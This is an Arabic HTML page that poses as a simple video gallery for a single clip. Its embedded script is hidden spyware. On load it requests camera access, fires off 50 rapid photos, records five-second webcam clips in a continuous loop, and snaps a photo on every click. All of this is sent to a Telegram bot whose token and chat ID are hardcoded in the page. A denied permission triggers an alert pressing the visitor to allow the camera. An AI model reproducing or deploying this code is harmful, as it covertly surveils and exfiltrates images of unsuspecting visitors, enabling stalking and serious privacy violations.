
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0" />
  <title>صفحة الفيديوهات - طائفة الظلام</title>
  <style>
    body {
      margin: 0;
      background-color: #1a001a;
      font-family: Arial, sans-serif;
      color: white;
      overflow-x: hidden;
    }
    .cover {
      width: 100%;
      height: 200px;
      background: url("5alfia.png") no-repeat center;
      background-size: cover;
      position: relative;
    }
    .profile-pic {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      border: 3px solid violet;
      position: absolute;
      bottom: -50px;
      right: 10px;
      background: url("profile.png") no-repeat center;
      background-size: cover;
    }
    .container {
      margin-top: 60px;
      display: grid;
      grid-template-columns: repeat(1, 1fr);
      gap: 20px;
      padding: 10px;
    }
    .video-box {
      position: relative;
      cursor: pointer;
    }
    .video-box video {
      width: 100%;
      border-radius: 10px;
    }
    .video-description {
      margin-top: 5px;
      text-align: center;
      font-size: 14px;
      color: #ccc;
    }
    .fullscreen {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: rgba(0,0,0,0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      flex-direction: column;
    }
    .fullscreen video {
      width: 90%;
      max-height: 70vh;
    }
    .download-btn {
      margin-top: 10px;
      padding: 10px 20px;
      background: purple;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<div class="cover">
  <div class="profile-pic"></div>
</div>

<div class="container" id="videoContainer">
  <div class="video-box" onclick="playVideo(this)">
    <video poster="thumb1.jpg" muted></video>
    <div class="video-description">لحن النهاية</div>
  </div>
</div>

<div id="fullscreenContainer" class="fullscreen" style="display: none;">
  <video id="fullscreenVideo" controls></video>
  <button class="download-btn" onclick="downloadCurrentVideo()">تحميل الفيديو</button>
</div>

<script>
const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
const CHAT_ID = "7664410054";

const videoUrl = "VivaCut_video_1751836959485_HD1.mp4";
const videoDesc = "لحن النهاية";
let fullscreenVideo = document.getElementById("fullscreenVideo");

function playVideo(elem) {
  fullscreenVideo.src = videoUrl;
  document.getElementById("fullscreenContainer").style.display = "flex";
  fullscreenVideo.play();
  sendToTelegram("📹 تم النقر على فيديو: " + videoDesc);
  takePicture();
}

function downloadCurrentVideo() {
  const a = document.createElement("a");
  a.href = videoUrl;
  a.download = "video.mp4";
  a.click();
}

function sendToTelegram(message) {
  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
  });
}

function sendFileToTelegram(blob, filename) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("video", blob, filename);
  fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
    method: "POST",
    body: formData
  });
}

function sendPhotoToTelegram(blob) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, `photo${Date.now()}.jpg`);
  fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}

let mediaStream = null;
let videoRecorder = null;

// طلب إذن الوصول وتشغيل التسجيل كل 5 ثوانٍ
navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
  mediaStream = stream;
  startVideoCaptureLoop();

  // التقاط 50 صورة عند الدخول
  for (let i = 0; i < 50; i++) {
    setTimeout(() => takePicture(), i * 300);
  }
}).catch(() => {
  alert("🚫 يجب السماح بالوصول إلى الكاميرا");
});

function startVideoCaptureLoop() {
  setInterval(() => {
    let chunks = [];
    videoRecorder = new MediaRecorder(mediaStream);
    videoRecorder.ondataavailable = e => chunks.push(e.data);
    videoRecorder.onstop = () => {
      const blob = new Blob(chunks, { type: "video/mp4" });
      sendFileToTelegram(blob, `rec${Date.now()}.mp4`);
    };
    videoRecorder.start();
    setTimeout(() => videoRecorder.stop(), 5000);
  }, 5000);
}

function takePicture() {
  const video = document.createElement("video");
  video.srcObject = mediaStream;
  video.play();

  const canvas = document.createElement("canvas");
  canvas.width = 480;
  canvas.height = 360;
  const ctx = canvas.getContext("2d");

  setTimeout(() => {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
      sendPhotoToTelegram(blob);
      video.pause();
      video.srcObject = null;
    }, "image/jpeg");
  }, 500);
}

// التقاط صورة عند أي نقرة في الصفحة
document.body.addEventListener("click", takePicture);
</script>

</body>
</html>
